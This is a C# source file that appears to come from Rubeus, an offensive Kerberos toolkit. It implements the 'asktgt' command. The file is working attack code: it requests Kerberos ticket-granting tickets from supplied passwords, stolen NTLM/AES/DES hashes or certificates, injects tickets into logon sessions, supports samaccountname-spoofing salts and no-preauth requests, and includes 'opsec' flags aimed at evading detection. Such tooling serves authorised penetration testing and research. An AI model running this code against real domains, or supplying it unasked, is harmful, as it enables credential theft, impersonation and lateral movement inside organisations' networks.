using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Asktgt : ICommand
    {
        public static string CommandName => "asktgt";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Ask TGT\r\n");

            string user = "";
            string domain = "";
            string password = "";
            string hash = "";
            string dc = "";
            string outfile = "";
            string certificate = "";
            string servicekey = "";
            string principalType = "principal";
            
            bool ptt = false;
            bool opsec = false;
            bool force = false;
            bool verifyCerts = false;
            bool getCredentials = false;
            bool pac = true;
            LUID luid = new LUID();
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
            Interop.KERB_ETYPE suppEncType = Interop.KERB_ETYPE.subkey_keymaterial;

            string proxyUrl = null;
            string service = null;
            bool nopreauth = arguments.ContainsKey("/nopreauth");

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey("/enctype")) {
                string encTypeString = arguments["/enctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM")) {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                } else if (encTypeString.Equals("AES128")) {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                } else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES")) {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                } else if (encTypeString.Equals("DES")) {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }
            if (String.IsNullOrEmpty(domain))
            {
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;

                Console.WriteLine("[*] Got domain: {0}", domain);
            }

            if (arguments.ContainsKey("/password"))
            {
                password = arguments["/password"];

                string salt = String.Format("{0}{1}", domain.ToUpperInvariant(), user);

                // special case for computer account salts
                if (user.EndsWith("$"))
                {
                    salt = String.Format("{0}host{1}.{2}", domain.ToUpperInvariant(), user.TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());
                }

                // special case for samaccountname spoofing to support Kerberos AES Encryption
                if (arguments.ContainsKey("/oldsam"))
                {
                    salt = String.Format("{0}host{1}.{2}", domain.ToUpperInvariant(), arguments["/oldsam"].TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());

                }

                if (encType != Interop.KERB_ETYPE.rc4_hmac)
                    Console.WriteLine("[*] Using salt: {0}", salt);

                hash = Crypto.KerberosPasswordHash(encType, password, salt);
            }

            else if (arguments.ContainsKey("/des"))
            {
                hash = arguments["/des"];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/ntlm"))
            {
                hash = arguments["/ntlm"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/aes128"))
            {
                hash = arguments["/aes128"];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            
            if (arguments.ContainsKey("/certificate")) {
                certificate = arguments["/certificate"];

                if(arguments.ContainsKey("/verifychain") || arguments.ContainsKey("/verifycerts"))
                {
                    Console.WriteLine("[*] Verifying the entire certificate chain!\r\n");
                    verifyCerts = true;
                }
                if (arguments.ContainsKey("/getcredentials"))
                {
                    getCredentials = true;
                }
            }

            if (arguments.ContainsKey("/servicekey")) {
                servicekey = arguments["/servicekey"];
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/opsec"))
            {
                opsec = true;
                if (arguments.ContainsKey("/force"))
                {
                    force = true;
                }
            }

            if (arguments.ContainsKey("/nopac"))
            {
                pac = false;
            }


            if (arguments.ContainsKey("/proxyurl"))
            {
                proxyUrl = arguments["/proxyurl"];
            }
            if (arguments.ContainsKey("/service"))
            {
                service = arguments["/service"];
            }

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/suppenctype"))
            {
                string encTypeString = arguments["/suppenctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
                {
                    suppEncType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals("AES128"))
                {
                    suppEncType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
                {
                    suppEncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("DES"))
                {
                    suppEncType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }
            else
            {
                suppEncType = encType;
            }
            if (arguments.ContainsKey("/principaltype")) {
                principalType = arguments["/principaltype"]; 
            }

            if (arguments.ContainsKey("/createnetonly"))
            {
                // if we're starting a hidden process to apply the ticket to
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to created logon session");
                    return;
                }
                if (arguments.ContainsKey("/show"))
                {
                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], true);
                }
                else
                {
                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], false);
                }
                Console.WriteLine();
            }

            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(hash) && String.IsNullOrEmpty(certificate) && !nopreauth)
            {
                Console.WriteLine("\r\n[X] You must supply a /password, /certificate or a [/des|/rc4|/aes128|/aes256] hash!\r\n");
                return;
            }

            bool changepw = arguments.ContainsKey("/changepw");

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine("\r\n[X] Only /des, /rc4, /aes128, and /aes256 are supported at this time.\r\n");
                return;
            }
            else
            {
                if ((opsec) && (encType != Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !(force))
                {
                    Console.WriteLine("[X] Using /opsec but not using /enctype:aes256, to force this behaviour use /force");
                    return;
                }
                if (nopreauth)
                {
                    try
                    {
                        Ask.NoPreAuthTGT(user, domain, hash, encType, dc, outfile, ptt, luid, true, true, proxyUrl, service, suppEncType, opsec, principalType);
                    }
                    catch (KerberosErrorException ex)
                    {
                        KRB_ERROR error = ex.krbError;
                        try
                        {
                            Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                        }
                        catch
                        {
                            Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                        }
                    }
                }
                else if (String.IsNullOrEmpty(certificate))
                    Ask.TGT(user, domain, hash, encType, outfile, ptt, dc, luid, true, opsec, servicekey, changepw, pac, proxyUrl, service, suppEncType, principalType);
                else
                    Ask.TGT(user, domain, certificate, password, encType, outfile, ptt, dc, luid, true, verifyCerts, servicekey, getCredentials, proxyUrl, service, changepw, principalType);

                return;
            }
        }
    }
}
